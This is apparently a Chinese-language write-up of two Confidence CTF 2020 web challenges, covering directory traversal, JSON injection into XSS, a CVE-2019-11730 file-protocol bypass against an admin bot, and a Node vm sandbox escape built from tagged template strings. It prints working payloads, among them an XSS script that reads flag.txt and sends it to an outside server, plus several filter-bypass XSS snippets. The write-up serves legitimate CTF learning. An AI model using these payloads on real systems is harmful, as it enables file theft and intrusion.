---
title: Confidence CTF 2020-Web
date: 2020-03-18 19:46:11
tags: CTF
---

#### Catweb

先看一下题目的js代码

```javascript
function getNewCats(kind) {
			$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
				if(data.status != 'ok')
				{
					return;
				}
				$('#cats_container').empty();
				cats = data.content;
				cats.forEach(function(cat) {
					var newDiv = document.createElement('div');
					newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
					$('#cats_container').append(newDiv);
				});
			});

		}
		$(document).ready(function() {
			$('#cat_select').change(function() {
				var kind = $(this).val();
				history.pushState({}, '', '?'+kind)
				getNewCats(kind);
			});
			var kind = window.location.search.substring(1);
			if(kind == "")
			{
				kind = 'black';
			}
			getNewCats(kind);
		});
```

在getNewCats函数中通过返回的json数据渲染div标签中的img图像，默认为黑色🐱，通过切换不同的颜色来渲染出不同🐱🐱的颜色。

很容易发现有目录穿越这个漏洞，并且可以通过目录穿越发现flag位于/templates/flag.txt

```
Payload:
http://catweb.zajebistyc.tf/cats?kind=..


返回结果：
{
status: "ok",
content: [
"prestart.sh",
"uwsgi.ini",
"main.py",
"templates",
"static",
"app.py"
]
}
```

还有另一个report通过，可以把url发给后台的bot 并且bot会不加任何验证的进行点击操作

比如我们发一个

```javascript
javascript:location="http://139.224.236.99:8787"
```

即可在自己的vps上监听到bot的请求

浏览完整个功能点后 回到第一个功能点可以发现可以进行json注入

![8wF8UA.png](https://s1.ax1x.com/2020/03/18/8wF8UA.png)

那么就意味着我们直接控制回显字段了

```
img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />
```

xss poc 如下：

```
","status":"ok","content":["\"/><script>alert(1)</script>"],"poc":"
```

其实这里我也比较好奇后台是怎么去检测这个路径的

```
..可以正常返回 而../xx/..却不行
但是..的逻辑实际上是等于../xx/..的
如果xx的形式可以的话 我们就用了另一种攻击方式 可以在kind处进行xss闭合
emm 对这点同样有思考的师傅欢迎来一起讨论
```

现在我们要做的是结合这个xss页面以及bot的点击将templates/flag.txt的内容带出

这里就用 **CVE-2019-11730** 这个漏洞

[POC及攻击视频](https://github.com/alidnf/CVE-2019-11730)

大概浏览下poc.html 可以得知这个CVE的攻击思路为通过当前location的file协议读取当前目录下的文件

部分代码如下：

```javascript
...
if (location.protocol != "file:"){
    console.log("- Error: File isn't loaded locally!");
    return;
}
...
function exploit(){
    // Use Clickjacking to trick the victim to click name of current file name in the hidden iframe.
    // First, Create a hidden iframe pointing to the parent directory.
    var exploit_iframe = document.createElement("iframe");
    exploit_iframe.src = "./";
    exploit_iframe.className = "exploit_iframe";
    document.body.append(exploit_iframe);
    // Second, Create a fake button and trick the user to click it.
    var fake_button = document.createElement("button");
    fake_button.className = "fake_button";
    fake_button.innerText = "Click Me! I have a gift for you!";
    document.body.append(fake_button);
}
...
```

通过exploit iframe以及button click完成二次触发load和Bypass SOP

那么攻击思路就很明显了

- 由于都是静态页面 file:///app/templates/index.html等价于catweb.zajebistyc.tf。
- 发送给后台bot file:///协议的payload 并且加上我们自己的js
- 后台点击触发

Payload如下：

```html
file:///app/templates/index.html?", "status": "ok", "content":["a\"><script>let xhr = new XMLHttpRequest();xhr.onload=()=>{location.href='http://vps?q='+encodeURIComponent(btoa(xhr.responseText))}; xhr.open('GET', 'flag.txt', false); xhr.send();  </script>"], "poc": "
```

### temple-js

通过这道题确实学到了很多

题目源码如下：

```javascript
const express = require("express")
const fs = require("fs")
const vm = require("vm")
const watchdog = require("./watchdog");

global.flag = fs.readFileSync("flag").toString()
const source = fs.readFileSync(__filename).toString()
const help = "There is no help on the way."

const app = express()
const port = 3000

app.use(express.json())
app.use('/', express.static('public'))

app.post('/repl', (req, res) => {
    let sandbox = vm.createContext({par: (v => `(${v})`), source, help})
    let validInput = /^[a-zA-Z0-9 ${}`]+$/g
    
    let command = req.body['cmd']
    
    console.log(`${req.ip}> ${command}`)

    let response;

    try {
        if(validInput.test(command))
        {    
            let watch = watchdog.schedule()
            try {
                response = vm.runInContext(command, sandbox, {
                    timeout: 300,
                    displayErrors: false
                });
            } finally {
                watchdog.stop(watch)
            }
        } else
            throw new Error("Invalid input.")
    } catch(ex)
    {
        response = ex.toString()
    }

    console.log(`${req.ip}< ${response}`)
    res.send(JSON.stringify({"response": response}))
})

console.log(`Listening on :${port}...`)
app.listen(port, '0.0.0.0')

```

代码量比较少，大意是逃逸掉沙箱拿到沙箱外定义的flag

对于沙箱逃逸：

我们可以通过constructor.constructor返回的Function来返回我们的flag

通过constructor.constructor拿到的Function为沙箱外的Function

首先来看一个例子

![8013RO.png](https://s1.ax1x.com/2020/03/18/8013RO.png)

我们可以直接通过Function来定义一个任意内容的函数，第三种函数的定义用到了标签模板字符串

下图为给的例子

![8BRleH.png](https://s1.ax1x.com/2020/03/18/8BRleH.png)

对应我们例子中的

```javascript
Function`a${7*7}`


ƒ anonymous(a,
) {
49
}

```

template String作为最后一个参数传入函数体内 成为我们自定义的函数内容，而a则作为此函数的参数。

那么接下来就可以写一个返回沙箱外函数的anoymous了



```javascript
Function`a${'return constructor.constructor'}````` 
// or ``
ƒ anonymous(
) {

}

```



不过我们输入的字符被正则限制了，不能有.这个字符，不过可以直接用

with条件进行代替，并且不允许有()，那我们可以用sandbox中的par函数来返回(constructor)来bypass这个正则，最终payload为：

```javascript
Function`a${`with${par`construtor`}return constructor`}`

```

再进行此anoymos函数的调用就可以获得Function了，然后再通过这个Function来返回沙箱外的flag.最后上个图：

![8B5OwF.png](https://s1.ax1x.com/2020/03/18/8B5OwF.png)

#### 拓展

用Function配和template String进行xss同样是很棒的攻击手法：

比如下面的Payload(tw上看到的)

```javascript
Function`a${unescape. call`${location}`}```

```

结合在url中输入%0aalert()//即可实现xss

```javascript
//拆分字母Bypass
Function`a${`return `+`aler`+`t(1)`}`
//字符编码Bypass
Function`a${`\x61\x6c\x65\x72\x74\x28\x29`}```


```

